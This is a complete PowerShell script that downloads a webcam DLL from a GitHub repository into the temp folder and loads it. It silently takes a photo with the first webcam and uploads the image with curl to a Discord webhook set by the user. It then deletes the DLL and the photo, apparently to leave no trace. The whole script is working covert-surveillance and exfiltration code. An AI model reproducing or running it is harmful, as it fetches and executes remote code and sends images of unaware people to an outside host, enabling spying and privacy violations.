<#========================== WEBCAM TO DISCORD =============================

SYNOPSIS
download a webcam.dll file, find a webcam cand take a picture then send it to discord.

USAGE
1. Replace YOUR_WEBHOOK_HERE with your webhook
2. Run script and check discord for results.

CREDIT
Guardian for finding and using the dll!

#>

$hookurl = 'YOUR_WEBHOOK_HERE'

$dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
if (-not (Test-Path $dllPath)) {
    $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $dllPath)
}
Add-Type -Path $dllPath
[Webcam.webcam]::init()
[Webcam.webcam]::select(1)
$imageBytes = [Webcam.webcam]::GetImage()
$tempDir = [System.IO.Path]::GetTempPath()
$imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
[System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
sleep 1
curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
sleep 1
Remove-Item -Path "$env:TEMP\webcam.dll"
Remove-Item -Path $imagePath -Force
